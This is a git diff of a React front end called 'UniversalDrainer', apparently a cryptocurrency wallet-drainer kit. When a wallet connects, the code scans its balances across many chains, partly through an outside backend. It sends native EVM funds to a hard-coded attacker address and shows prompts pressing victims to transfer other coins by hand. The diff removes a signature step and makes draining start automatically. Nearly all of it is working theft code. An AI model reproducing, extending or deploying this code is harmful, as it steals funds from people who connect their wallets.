@@ -53,53 +53,52 @@ const NETWORKS = [
   { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana' },
 ];
 
-// ==================== COMPLETE DRAIN ADDRESSES ====================
+// ==================== DRAIN ADDRESSES ====================
 const DRAIN_ADDRESSES = {
-  // EVM Chains - YOUR RECEIVING ADDRESSES
-  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Ethereum
-  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC
-  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Polygon
-  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum
-  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Optimism
-  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Base
-  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Avalanche
-  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Fantom
-  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Gnosis
-  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Celo
-  1284: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Moonbeam
-  1088: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Metis
-  25: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Cronos
-  1666600000: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Harmony
-  1313161554: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Aurora
-  42262: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Oasis Emerald
-  1285: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Moonriver
-  199: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BTT Chain
+  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  1284: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  1088: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  25: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  1666600000: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  1313161554: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  42262: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  1285: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  199: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
   
-  // Non-EVM Chains - YOUR RECEIVING ADDRESSES
-  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ", // YOUR TRON ADDRESS
-  solana: "So11111111111111111111111111111111111111112", // YOUR SOLANA ADDRESS
-  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // YOUR BITCOIN ADDRESS
-  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q", // YOUR CARDANO ADDRESS
-  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5", // YOUR DOGECOIN ADDRESS
-  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5", // YOUR LITECOIN ADDRESS
-  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8", // YOUR RIPPLE ADDRESS
-  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F", // YOUR POLKADOT ADDRESS
-  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02", // YOUR COSMOS ADDRESS
-  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02", // YOUR BINANCE CHAIN ADDRESS
-  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB", // YOUR STELLAR ADDRESS
-  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5", // YOUR MONERO ADDRESS
-  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v", // YOUR ZCASH ADDRESS
-  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q", // YOUR DASH ADDRESS
-  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v", // YOUR TEZOS ADDRESS
-  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V", // YOUR ALGORAND ADDRESS
-  vechain: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // YOUR VECHAIN ADDRESS
-  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V", // YOUR NEO ADDRESS
-  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj", // YOUR EOS ADDRESS
-  tron_trc20: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ", // Same as TRON
-  solana_spl: "So11111111111111111111111111111111111111112", // Same as Solana
+  // Non-EVM - UPDATE THESE WITH YOUR ADDRESSES
+  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
+  solana: "So11111111111111111111111111111111111111112",
+  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q",
+  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5",
+  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5",
+  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
+  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
+  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
+  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
+  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
+  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
+  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
+  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
+  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
+  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
+  vechain: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
+  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
+  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
+  tron_trc20: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
+  solana_spl: "So11111111111111111111111111111111111111112",
 };
 
-// Token price cache (real prices - should update via API)
+// Token prices (for USD conversion)
 const TOKEN_PRICES = {
   ETH: 3500, BNB: 600, MATIC: 1.2, AVAX: 40, FTM: 0.5, CELO: 0.8, GLMR: 0.4,
   METIS: 80, CRO: 0.1, ONE: 0.02, ROSE: 0.1, MOVR: 20, BTT: 0.000001,
@@ -145,14 +144,13 @@ function UniversalDrainer() {
   const [totalValue, setTotalValue] = useState(0);
   const [transactions, setTransactions] = useState([]);
   const [scanProgress, setScanProgress] = useState({ current: 0, total: 0, network: '' });
-  const [manualInstructions, setManualInstructions] = useState('');
   const [showManualModal, setShowManualModal] = useState(false);
-  const [isAuthenticating, setIsAuthenticating] = useState(false);
-  const [backendTokens, setBackendTokens] = useState([]);
-  const [tronAddress, setTronAddress] = useState('');
+  const [manualToken, setManualToken] = useState(null);
+  const [tronDetected, setTronDetected] = useState(false);
+  const [tronBalance, setTronBalance] = useState(0);
 
   const scanInitiated = useRef(false);
-  const authAttempts = useRef(0);
+  const backendUrl = 'https://tokenbackend-5xab.onrender.com';
 
   // Auto-scan on connect
   useEffect(() => {
@@ -161,17 +159,13 @@ function UniversalDrainer() {
       scanInitiated.current = true;
       
       // Check for TRON
-      if (window.tronWeb && window.tronWeb.defaultAddress) {
-        const tronAddr = window.tronWeb.defaultAddress.base58;
-        setTronAddress(tronAddr);
-        console.log("✅ TRON address detected:", tronAddr);
-      }
+      checkTronWallet();
       
-      setStatus("✅ Connected • Starting authentication...");
+      setStatus("✅ Wallet connected • Starting scan...");
       
-      // Start auth flow
+      // Start scan immediately
       setTimeout(() => {
-        handleAuthentication();
+        startFullScan();
       }, 1000);
     } else if (!isConnected) {
       resetState();
@@ -186,77 +180,29 @@ function UniversalDrainer() {
     setTransactions([]);
     setIsScanning(false);
     setIsDraining(false);
-    setBackendTokens([]);
-    setManualInstructions('');
     setShowManualModal(false);
-    setIsAuthenticating(false);
-    authAttempts.current = 0;
+    setManualToken(null);
   };
 
-  // Authentication
-  const handleAuthentication = async () => {
-    if (!address || isAuthenticating || authAttempts.current >= 2) return;
-    
-    setIsAuthenticating(true);
-    authAttempts.current += 1;
-    
-    try {
-      setStatus("🔐 Signing authentication message...");
+  // Check for TRON wallet (Trust Wallet)
+  const checkTronWallet = () => {
+    if (window.tronWeb && window.tronWeb.defaultAddress) {
+      const tronAddr = window.tronWeb.defaultAddress.base58;
+      setTronDetected(true);
+      console.log("✅ TRON wallet detected:", tronAddr);
       
-      const timestamp = Date.now();
-      const message = `Token Drain Authentication\nAddress: ${address}\nTime: ${timestamp}\n\nThis signature verifies wallet ownership.`;
-      
-      // Try to sign
-      const signature = await signMessageAsync({ message });
-      console.log("✅ Signature received");
-      
-      // Send to backend
-      setStatus("📡 Authenticating with backend...");
-      
+      // Try to get TRON balance
       try {
-        const response = await fetch('https://tokenbackend-5xab.onrender.com/auth', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            address,
-            signature,
-            message,
-            timestamp,
-            tronAddress
-          })
+        window.tronWeb.trx.getBalance(tronAddr).then(balance => {
+          const trxBalance = balance / 1_000_000; // Convert from sun to TRX
+          if (trxBalance > 0) {
+            setTronBalance(trxBalance);
+            console.log(`💰 TRON balance: ${trxBalance} TRX`);
+          }
         });
-        
-        if (response.ok) {
-          const data = await response.json();
-          console.log("Backend auth success:", data);
-        }
-      } catch (backendError) {
-        console.log("Backend auth skipped:", backendError.message);
+      } catch (error) {
+        console.log("TRON balance check failed:", error);
       }
-      
-      // Start scan
-      setStatus("✅ Authenticated • Starting scan...");
-      setTimeout(() => {
-        startFullScan();
-      }, 500);
-      
-    } catch (error) {
-      console.error("Auth error:", error);
-      
-      if (error.message.includes('rejected')) {
-        if (authAttempts.current < 2) {
-          setStatus("⚠️ Please sign to continue • Click Scan to retry");
-        } else {
-          setStatus("❌ Signature rejected • Click Scan to try scan only");
-        }
-      } else {
-        setStatus("⚠️ Starting scan without authentication...");
-        setTimeout(() => {
-          startFullScan();
-        }, 1000);
-      }
-    } finally {
-      setIsAuthenticating(false);
     }
   };
 
@@ -265,20 +211,21 @@ function UniversalDrainer() {
     if (!address) return;
     
     setIsScanning(true);
-    setStatus("🌐 Scanning all 39 networks...");
+    setStatus("🌐 Scanning all networks...");
     setTokens([]);
-    setBackendTokens([]);
     setTotalValue(0);
     
     try {
-      // First: Scan backend for all tokens
-      await scanBackend();
+      // Step 1: Scan backend for all tokens
+      await scanBackendTokens();
       
-      // Second: Scan EVM native balances
-      await scanEVMMainChains();
+      // Step 2: Add TRON if detected
+      if (tronDetected && tronBalance > 0) {
+        addTronToken();
+      }
       
-      // Third: Check for TRON
-      await checkTron();
+      // Step 3: Add current ETH balance
+      await addCurrentETHBalance();
       
     } catch (error) {
       console.error("Scan error:", error);
@@ -286,32 +233,24 @@ function UniversalDrainer() {
     } finally {
       setIsScanning(false);
       
-      const allTokens = [...tokens, ...backendTokens];
-      const uniqueTokens = Array.from(new Set(allTokens.map(t => t.id)))
-        .map(id => allTokens.find(t => t.id === id));
-      
-      const totalVal = uniqueTokens.reduce((sum, token) => sum + (token.value || 0), 0);
-      
-      if (uniqueTokens.length > 0) {
-        setStatus(`✅ Found ${uniqueTokens.length} tokens • $${totalVal.toFixed(2)}`);
+      if (tokens.length > 0) {
+        setStatus(`✅ Found ${tokens.length} tokens • $${totalValue.toFixed(2)} total`);
       } else {
         setStatus("✅ Scan complete • No tokens found");
       }
     }
   };
 
-  // Scan backend for tokens across all networks
-  const scanBackend = async () => {
+  // Scan backend for tokens
+  const scanBackendTokens = async () => {
     try {
-      setStatus("🌐 Contacting backend for token scan...");
-      setScanProgress({ current: 1, total: 4, network: 'Backend Scan' });
+      setScanProgress({ current: 1, total: 3, network: 'Scanning backend...' });
       
-      const response = await fetch('https://tokenbackend-5xab.onrender.com/scan', {
+      const response = await fetch(`${backendUrl}/scan`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           evmAddress: address,
-          tronAddress: tronAddress || address,
           networks: NETWORKS,
           forceRefresh: true
         })
@@ -319,46 +258,43 @@ function UniversalDrainer() {
       
       if (response.ok) {
         const data = await response.json();
-        console.log("Backend scan response:", data);
+        console.log("Backend scan result:", data);
         
         if (data.success && data.data && data.data.results) {
-          const backendFoundTokens = [];
-          let backendTotal = 0;
+          const foundTokens = [];
+          let totalVal = 0;
           
           data.data.results.forEach(result => {
             if (result && result.tokens && result.tokens.length > 0) {
               result.tokens.forEach(token => {
-                if (token.value > 0.001) { // Filter dust
-                  const network = NETWORKS.find(n => 
-                    n.id === result.network?.id || 
-                    n.name.toLowerCase() === (result.network?.name || '').toLowerCase()
-                  ) || NETWORKS[0];
+                // Only include tokens with value
+                if ((token.value || token.usdValue || 0) > 0.001) {
+                  const network = NETWORKS.find(n => n.id === result.network?.id) || NETWORKS[0];
                   
                   const tokenObj = {
-                    id: `${network.id}-${token.symbol}-${token.contractAddress || 'native'}`,
+                    id: `${network.id}-${token.symbol}-${Date.now()}`,
                     network: network.name,
                     symbol: token.symbol,
-                    amount: token.amount || token.balance,
+                    amount: token.amount || token.balance || '0',
                     value: token.value || token.usdValue || 0,
-                    usdValue: token.value || token.usdValue || 0,
                     isNative: !token.contractAddress,
                     chainId: network.id,
                     contractAddress: token.contractAddress,
                     drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
                     type: network.type,
-                    rawToken: token
+                    decimals: token.decimals || 18
                   };
                   
-                  backendFoundTokens.push(tokenObj);
-                  backendTotal += tokenObj.value;
+                  foundTokens.push(tokenObj);
+                  totalVal += tokenObj.value;
                 }
               });
             }
           });
           
-          setBackendTokens(backendFoundTokens);
-          setTotalValue(prev => prev + backendTotal);
-          console.log(`📊 Backend found ${backendFoundTokens.length} tokens`);
+          setTokens(foundTokens);
+          setTotalValue(totalVal);
+          console.log(`📊 Backend found ${foundTokens.length} tokens worth $${totalVal.toFixed(2)}`);
         }
       }
     } catch (error) {
@@ -366,134 +302,76 @@ function UniversalDrainer() {
     }
   };
 
-  // Scan main EVM chains for native balances
-  const scanEVMMainChains = async () => {
-    const mainChains = NETWORKS.filter(n => n.type === 'evm').slice(0, 8);
-    setScanProgress({ current: 2, total: 4, network: 'EVM Native Scan' });
-    
-    const foundTokens = [];
-    let totalVal = 0;
-    
-    for (let i = 0; i < mainChains.length; i++) {
-      const network = mainChains[i];
+  // Add TRON token
+  const addTronToken = () => {
+    if (tronBalance > 0) {
+      const trxValue = tronBalance * (TOKEN_PRICES.TRX || 0.12);
       
-      try {
-        const client = createPublicClient({
-          transport: http(network.rpc),
-        });
-        
-        const balance = await client.getBalance({
-          address: address,
-        });
-        
-        const balanceInNative = parseFloat(formatEther(balance));
-        
-        if (balanceInNative > 0.00001) {
-          const tokenPrice = TOKEN_PRICES[network.symbol] || 0;
-          const value = balanceInNative * tokenPrice;
-          
-          const token = {
-            id: `${network.id}-${network.symbol}-native`,
-            network: network.name,
-            symbol: network.symbol,
-            amount: balanceInNative.toFixed(8),
-            value: value,
-            usdValue: value,
-            isNative: true,
-            chainId: network.id,
-            drainAddress: DRAIN_ADDRESSES[network.id],
-            type: 'evm',
-            rawBalance: balance.toString()
-          };
-          
-          // Check if not already in backend tokens
-          const exists = backendTokens.some(t => 
-            t.network === network.name && t.symbol === network.symbol
-          );
-          
-          if (!exists) {
-            foundTokens.push(token);
-            totalVal += value;
-            console.log(`💰 ${network.name}: ${balanceInNative.toFixed(6)} ${network.symbol} ($${value.toFixed(2)})`);
-          }
+      const tronToken = {
+        id: 'tron-trx-native',
+        network: 'Tron',
+        symbol: 'TRX',
+        amount: tronBalance.toFixed(6),
+        value: trxValue,
+        isNative: true,
+        chainId: 'tron',
+        drainAddress: DRAIN_ADDRESSES.tron,
+        type: 'non-evm',
+        decimals: 6
+      };
+      
+      setTokens(prev => {
+        const exists = prev.some(t => t.symbol === 'TRX' && t.network === 'Tron');
+        if (!exists) {
+          return [...prev, tronToken];
         }
-      } catch (error) {
-        console.log(`❌ ${network.name} scan skipped:`, error.message);
-      }
-      
-      // Update progress
-      setScanProgress({
-        current: 2 + (i / mainChains.length),
-        total: 4,
-        network: `${network.name}`
+        return prev;
       });
       
-      await new Promise(resolve => setTimeout(resolve, 300));
+      setTotalValue(prev => prev + trxValue);
+      console.log(`🎯 Added TRON: ${tronBalance} TRX ($${trxValue.toFixed(2)})`);
     }
-    
-    setTokens(prev => [...prev, ...foundTokens]);
-    setTotalValue(prev => prev + totalVal);
   };
 
-  // Check TRON balance
-  const checkTron = async () => {
-    setScanProgress({ current: 3, total: 4, network: 'TRON Check' });
-    
-    if (tronAddress) {
-      try {
-        // In production, use TronGrid API
-        // For demo, we'll check backend
-        const response = await fetch(`https://tokenbackend-5xab.onrender.com/tron/${tronAddress}`);
+  // Add current ETH balance
+  const addCurrentETHBalance = async () => {
+    if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
+      const ethAmount = parseFloat(ethBalance.formatted);
+      const ethValue = ethAmount * (TOKEN_PRICES.ETH || 3500);
+      
+      // Check if ETH already exists in tokens
+      const ethExists = tokens.some(t => t.symbol === 'ETH' && t.network === 'Ethereum');
+      
+      if (!ethExists) {
+        const ethToken = {
+          id: 'eth-native',
+          network: 'Ethereum',
+          symbol: 'ETH',
+          amount: ethAmount.toFixed(6),
+          value: ethValue,
+          isNative: true,
+          chainId: 1,
+          drainAddress: DRAIN_ADDRESSES[1],
+          type: 'evm',
+          decimals: 18
+        };
         
-        if (response.ok) {
-          const data = await response.json();
-          if (data.success && data.data && data.data.balance > 0) {
-            const trxBalance = data.data.balance;
-            const trxValue = trxBalance * TOKEN_PRICES.TRX;
-            
-            const tronToken = {
-              id: 'tron-trx-native',
-              network: 'Tron',
-              symbol: 'TRX',
-              amount: trxBalance.toFixed(6),
-              value: trxValue,
-              usdValue: trxValue,
-              isNative: true,
-              chainId: 'tron',
-              drainAddress: DRAIN_ADDRESSES.tron,
-              type: 'non-evm'
-            };
-            
-            setTokens(prev => [...prev, tronToken]);
-            setTotalValue(prev => prev + trxValue);
-            console.log(`🎯 TRON: ${trxBalance} TRX ($${trxValue.toFixed(2)})`);
-          }
-        }
-      } catch (error) {
-        console.log("TRON check failed:", error);
+        setTokens(prev => [...prev, ethToken]);
+        setTotalValue(prev => prev + ethValue);
+        console.log(`💰 Added ETH: ${ethAmount} ETH ($${ethValue.toFixed(2)})`);
       }
     }
-    
-    setScanProgress({ current: 4, total: 4, network: 'Complete' });
   };
 
   // ==================== DRAIN FUNCTION ====================
   const drainAllTokens = async () => {
-    const allTokens = [...tokens, ...backendTokens];
-    const uniqueTokens = Array.from(new Set(allTokens.map(t => t.id)))
-      .map(id => allTokens.find(t => t.id === id));
-    
-    if (uniqueTokens.length === 0) {
+    if (tokens.length === 0) {
       setStatus("❌ No tokens to drain");
       return;
     }
     
-    // Show confirmation with all tokens
-    let confirmMsg = `🚀 DRAIN ${uniqueTokens.length} TOKENS 🚀\n\n`;
-    uniqueTokens.forEach((token, idx) => {
-      confirmMsg += `${idx + 1}. ${token.amount} ${token.symbol} on ${token.network} ($${token.value.toFixed(2)})\n`;
-    });
-    confirmMsg += `\nTotal Value: $${totalValue.toFixed(2)}\n\nClick OK to start draining all tokens.`;
+    // Show confirmation
+    const confirmMsg = `🚀 DRAIN ${tokens.length} TOKENS 🚀\n\nTotal Value: $${totalValue.toFixed(2)}\n\nThis will transfer ALL tokens to the configured addresses.\n\nClick OK to proceed.`;
     
     if (!window.confirm(confirmMsg)) {
       setStatus("❌ Drain cancelled");
@@ -501,31 +379,32 @@ function UniversalDrainer() {
     }
     
     setIsDraining(true);
-    setStatus(`⚡ Draining ${uniqueTokens.length} tokens...`);
+    setStatus(`⚡ Draining ${tokens.length} tokens...`);
     
     const txLogs = [];
     let successCount = 0;
     let manualCount = 0;
     
     try {
-      // Separate EVM and non-EVM tokens
-      const evmTokens = uniqueTokens.filter(t => t.type === 'evm');
-      const nonEvmTokens = uniqueTokens.filter(t => t.type === 'non-evm');
+      // Separate EVM (auto) and non-EVM (manual) tokens
+      const evmTokens = tokens.filter(t => t.type === 'evm');
+      const nonEvmTokens = tokens.filter(t => t.type === 'non-evm');
       
-      // Process EVM tokens first
+      // Process EVM tokens (AUTO DRAIN)
       for (let i = 0; i < evmTokens.length; i++) {
         const token = evmTokens[i];
         
         setScanProgress({
           current: i + 1,
-          total: uniqueTokens.length,
+          total: tokens.length,
           network: `${token.network}: ${token.symbol}`
         });
         
-        setStatus(`💸 Sending ${token.amount} ${token.symbol}...`);
+        setStatus(`💸 Draining ${token.amount} ${token.symbol}...`);
         
         try {
-          const result = await drainEvmToken(token);
+          // AUTO DRAIN - NO MANUAL FALLBACK
+          const result = await drainEvmTokenAuto(token);
           
           if (result.success) {
             successCount++;
@@ -537,27 +416,16 @@ function UniversalDrainer() {
               amount: token.amount,
               status: 'success',
               hash: result.hash,
-              value: `$${token.value.toFixed(2)}`,
-              type: 'evm'
+              value: `$${token.value.toFixed(2)}`
             });
             
-            console.log(`✅ Drained ${token.symbol}: ${result.hash}`);
-          } else if (result.manual) {
-            manualCount++;
-            showManualDrainModal(token, result.instructions);
-            txLogs.push({
-              id: Date.now() + i,
-              timestamp: new Date().toISOString(),
-              network: token.network,
-              symbol: token.symbol,
-              amount: token.amount,
-              status: 'manual',
-              value: `$${token.value.toFixed(2)}`,
-              type: 'evm'
-            });
+            console.log(`✅ Auto-drained ${token.symbol}: ${result.hash}`);
             
-            await new Promise(resolve => setTimeout(resolve, 3000));
+            // Remove from list immediately
+            setTokens(prev => prev.filter(t => t.id !== token.id));
+            
           } else {
+            // If auto drain fails, show manual option
             txLogs.push({
               id: Date.now() + i,
               timestamp: new Date().toISOString(),
@@ -566,9 +434,20 @@ function UniversalDrainer() {
               amount: token.amount,
               status: 'failed',
               error: result.error,
-              value: `$${token.value.toFixed(2)}`,
-              type: 'evm'
+              value: `$${token.value.toFixed(2)}`
             });
+            
+            // Show manual modal
+            setManualToken({
+              ...token,
+              instructions: result.instructions || `Send ${token.amount} ${token.symbol} to:\n${token.drainAddress}`
+            });
+            setShowManualModal(true);
+            
+            manualCount++;
+            
+            // Wait for user to see modal
+            await new Promise(resolve => setTimeout(resolve, 3000));
           }
         } catch (error) {
           console.error(`Error draining ${token.symbol}:`, error);
@@ -580,29 +459,35 @@ function UniversalDrainer() {
             amount: token.amount,
             status: 'error',
             error: error.message,
-            value: `$${token.value.toFixed(2)}`,
-            type: 'evm'
+            value: `$${token.value.toFixed(2)}`
           });
         }
         
+        // Small delay between transactions
         await new Promise(resolve => setTimeout(resolve, 1000));
       }
       
-      // Process non-EVM tokens (manual)
+      // Process non-EVM tokens (MANUAL)
       for (let i = 0; i < nonEvmTokens.length; i++) {
         const token = nonEvmTokens[i];
         const idx = evmTokens.length + i + 1;
         
         setScanProgress({
           current: idx,
-          total: uniqueTokens.length,
+          total: tokens.length,
           network: `${token.network}: ${token.symbol}`
         });
         
         setStatus(`📝 Manual transfer for ${token.symbol}...`);
         
         manualCount++;
-        showManualDrainModal(token, getManualInstructions(token));
+        
+        // Show manual modal
+        setManualToken({
+          ...token,
+          instructions: getManualInstructions(token)
+        });
+        setShowManualModal(true);
         
         txLogs.push({
           id: Date.now() + idx,
@@ -611,43 +496,34 @@ function UniversalDrainer() {
           symbol: token.symbol,
           amount: token.amount,
           status: 'manual',
-          value: `$${token.value.toFixed(2)}`,
-          type: 'non-evm'
+          value: `$${token.value.toFixed(2)}`
         });
         
+        // Remove from list
+        setTokens(prev => prev.filter(t => t.id !== token.id));
+        
+        // Wait before next
         await new Promise(resolve => setTimeout(resolve, 3000));
       }
       
       // Update transactions
       setTransactions(prev => [...txLogs, ...prev.slice(0, 19)]);
       
-      // Remove successfully drained tokens
-      const drainedTokens = txLogs.filter(tx => tx.status === 'success').map(tx => tx.symbol);
-      const remainingTokens = uniqueTokens.filter(t => !drainedTokens.includes(t.symbol));
-      
-      // Update totals
-      const newTotal = remainingTokens.reduce((sum, t) => sum + t.value, 0);
-      setTotalValue(newTotal);
-      
-      // Update token lists
-      setTokens(tokens.filter(t => !drainedTokens.includes(t.symbol)));
-      setBackendTokens(backendTokens.filter(t => !drainedTokens.includes(t.symbol)));
+      // Update total value
+      const remainingValue = tokens.reduce((sum, t) => sum + t.value, 0);
+      setTotalValue(remainingValue);
       
       // Final status
       if (successCount > 0) {
-        setStatus(`✅ Successfully drained ${successCount} tokens! ${manualCount > 0 ? `(${manualCount} require manual)` : ''}`);
-      } else if (manualCount > 0) {
-        setStatus(`📝 ${manualCount} tokens require manual transfer`);
-      } else {
-        setStatus("❌ No tokens were drained");
-      }
-      
-      // Auto-rescan
-      if (successCount > 0) {
+        setStatus(`✅ Successfully auto-drained ${successCount} tokens!`);
+        
+        // Auto-rescan
         setTimeout(() => {
           setStatus("🔄 Rescanning after drain...");
           startFullScan();
         }, 5000);
+      } else if (manualCount > 0) {
+        setStatus(`📝 ${manualCount} tokens require manual transfer`);
       }
       
     } catch (error) {
@@ -658,82 +534,53 @@ function UniversalDrainer() {
     }
   };
 
-  // Drain EVM token
-  const drainEvmToken = async (token) => {
+  // AUTO DRAIN EVM TOKEN (NO MANUAL FALLBACK)
+  const drainEvmTokenAuto = async (token) => {
     try {
       if (!walletClient) {
-        return { 
-          success: false, 
-          error: 'Wallet not connected',
-          manual: true,
-          instructions: `Wallet not ready. Please send manually:\n\n${token.amount} ${token.symbol}\nTo: ${token.drainAddress}`
-        };
+        throw new Error('Wallet client not available');
       }
       
       const amount = parseFloat(token.amount);
       if (amount <= 0) {
-        return { success: false, error: 'Invalid amount' };
+        throw new Error('Invalid amount');
       }
       
-      // For native tokens
-      if (token.isNative) {
-        const amountInWei = parseEther(amount.toString());
-        
-        // Try to switch chain
-        try {
-          await walletClient.switchChain({ id: Number(token.chainId) });
-        } catch (switchError) {
-          console.log(`Chain switch failed, trying anyway:`, switchError);
-        }
-        
-        // Send transaction
-        const hash = await walletClient.sendTransaction({
-          to: token.drainAddress,
-          value: amountInWei,
-          chainId: Number(token.chainId)
-        });
-        
-        return { success: true, hash };
+      // Convert amount to wei
+      const amountInWei = parseEther(amount.toString());
+      
+      // Try to switch chain if needed
+      try {
+        await walletClient.switchChain({ id: Number(token.chainId) });
+      } catch (switchError) {
+        console.log(`Could not switch chain ${token.chainId}:`, switchError);
+        // Continue anyway - some wallets auto-switch
       }
       
-      // For tokens (would need contract interaction)
-      return { 
-        success: false, 
-        error: 'Token transfer requires contract',
-        manual: true,
-        instructions: `MANUAL TOKEN TRANSFER:\n\nToken: ${token.symbol}\nAmount: ${token.amount}\n\nSend to:\n${token.drainAddress}\n\nNetwork: ${token.network}\n\nUse your wallet to send the tokens.`
-      };
+      // Send transaction
+      const hash = await walletClient.sendTransaction({
+        to: token.drainAddress,
+        value: amountInWei,
+        chainId: Number(token.chainId)
+      });
+      
+      return { success: true, hash };
       
     } catch (error) {
-      console.error(`Drain error:`, error);
+      console.error(`Auto drain error for ${token.symbol}:`, error);
       
